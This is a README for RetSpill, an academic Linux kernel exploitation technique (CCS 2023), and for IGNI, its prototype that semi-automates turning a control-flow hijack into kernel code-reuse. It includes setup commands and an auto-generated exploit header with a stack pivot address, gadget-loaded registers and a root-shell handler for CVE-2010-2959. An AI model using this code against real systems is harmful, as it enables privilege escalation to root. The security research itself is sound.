# RetSpill

RetSpill is a Linux kernel exploitation technique.

It uses the fact that there are already user-controllable data readily on the kernel stack when attackers obtain CFHP (control-flow hijacking primitive).
Since the kernel stack for a specific thread (task) is shared, attackers can spill controlled data on the kernel stack before hand, and use stack shifting gadgets to redirect the control-flow (when CFHP is obtained) to the controlled region to launch code-reuse attack.

Using clever downstream usage of this fact, a CFHP can be turned into unlimited arbitrary read/write/execute without sacrificing the exploit reliability for heap-based vulnerability. This is because we can overwrite the function pointer on heap with a stack-shifting gadget, and invoke the function pointer again and again in different task-context. Most importantly, in each invocation, the payload on stack can be different, leading to invoking different payload without manipulating the heap, thus without introducing exploit reliability degradation.

In this work, we demonstrate that this technique is so simple that it can be semi-automated with our prototype, IGNI.

This repository contains the dataset we used in the paper and our research prototype IGNI.

# Paper

To be presented at CCS 2023

# IGNI

The name is a reference to a magical sign, [Igni](https://witcher.fandom.com/wiki/Igni), in the video game [Witcher 3: Wild Hunt](https://witcher.fandom.com/wiki/Igni#The_Witcher_3:_Wild_Hunt).
Igni can cast a burst of flame to enemies and and set enemies on fire if they are spilled with flammable substances, just like userspace input ;).

## Setup

### Install Dependencies
Install rust as instructed by its [official website](https://www.rust-lang.org/tools/install).
~~~
cargo install ropr
~~~

### Build QEMU
Igni uses QEMU v7.2.0 internally and it has to be v7.2.0. QEMU with version lower or higher than v7.2.0 has issues reconnecting to gdb after snapshot restoration.
~~~
git clone -b v7.2.0 --depth 1 https://git.qemu.org/git/qemu.git
mkdir qemu/build && cd qemu/build && ../configure --target-list=x86_64-softmmu --python=`which python3` --disable-debug-info --enable-slirp && make -j`nproc`
~~~

### Build File System Image
~~~
cd scripts/create-image/ && ./create-image.sh && cd ../..
~~~

## Sample Usage
Run the following command, where `<retspill>/exploit_env/CVEs/CVE-2010-2959/poc/poc` is a proof-of-concept binary that will crash the kernel at `PC==0xffffffffdeadbeef`.
~~~
python analyzer.py -k <retspill>/exploit_env/CVEs/CVE-2010-2959/kernel/arch/x86/boot/bzImage -e <retspill>/exploit_env/CVEs/CVE-2010-2959/poc/poc
~~~
After about 5-10 minutes, the system will output something like the following:
~~~
unsigned long pivot = 0xffffffff8194609e;
==============================================================
/******************************************************************/
/*************************AUTO GENERATED***************************/
#define _GNU_SOURCE
#ifndef va_start
#include <stdarg.h>
#endif
#ifndef assert
#include <assert.h>
#endif
#ifndef signal
#include <signal.h>
#endif
#ifndef sched_setaffinity
#include <sched.h>
#endif

// we need this because rcx may not be restored in the trampoline
// so it will crash during kernel-user switch
void get_shell(int signum) {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
    while(1);
}

void __attribute__((constructor)) _igni_init() {
    signal(SIGSEGV, get_shell);
    signal(SIGTRAP, get_shell);
}

unsigned long _args[6];
unsigned long _arg_num = 0;
void __trigger()
{
    
    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov rcx, %0;"
            "mov rdi, [rcx+8*0];"
            "mov rsi, [rcx+8*1];"
            "mov rdx, [rcx+8*2];"
            "mov r10, [rcx+8*3];"
            "mov r8, [rcx+8*4];"
            "mov r9, [rcx+8*5];"

                        "mov rbx, 0xffffffff81e001bb;"
                        "mov rbp, 0xffffffff8244ab00;"
                        "mov r12, 0xffffffff810d0ad0;"
                        "mov r13, 0xffffffff81a373ec;"
                        "mov r10, 0xffffffff81c00162;"
            
            "mov rax, 16;"
            "syscall;"
            "pop rbp;"
            ".att_syntax;"
            : : "r"(_args));
}

void _trigger(int num_args, ...)
{
    va_list ap;
    va_start(ap, num_args);
    for(int i=0; i<num_args; i++) {
        _args[_arg_num++] = va_arg(ap, unsigned long);
    }
    va_arg(ap, unsigned long);
    va_end(ap);

    __asm__(".intel_syntax noprefix;"
            "call __trigger;"
            ".att_syntax;");
    _arg_num = 0;
    if(getuid() == 0) get_shell(0);
}

#define NUMARGS(...)  (sizeof((unsigned long[]){__VA_ARGS__})/sizeof(unsigned long))
#define ignite(...) _trigger(NUMARGS(__VA_ARGS__), __VA_ARGS__ )
/*************************AUTO GENERATED***************************/
/******************************************************************/
~~~

All you need to do is to:
1. include the generated header file
2. hijack the kernel control-flow to `unsigned long pivot = 0xffffffff8194609e;`
3. change how you invoke the triggering system call to `ignite(...)`
Then you can enjoy your root shell!!!

A sample result can be found at `<retspill>/exploit_env/CVEs/CVE-2010-2959/poc/exp.c` (the original is poc.c)
